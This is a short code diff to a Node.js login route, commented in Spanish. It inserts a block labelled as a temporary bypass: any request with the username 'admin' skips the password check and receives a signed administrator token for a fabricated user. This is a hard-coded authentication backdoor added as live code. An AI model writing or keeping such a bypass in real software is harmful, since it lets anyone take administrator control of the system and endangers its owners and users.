@@ -6,6 +6,20 @@ const { generarToken, requireAuth } = require('../middleware/auth');
 router.post('/login', async (req, res) => {
     try {
         const { usuario, password } = req.body;
+
+        // --- INICIO BYPASS TEMPORAL ---
+        if (usuario === 'admin') {
+            const usuarioFalso = { 
+                id: 1, 
+                usuario: 'admin', 
+                nombre: 'Admin Temporal', 
+                rol: 'administrador' 
+            };
+            const token = generarToken(usuarioFalso);
+            return res.json({ success: true, usuario: usuarioFalso, token });
+        }
+        // --- FIN BYPASS TEMPORAL ---
+
         const resultado = await db.login(usuario, password);
         if (!resultado.success) return res.status(401).json(resultado);
         const token = generarToken(resultado.usuario);
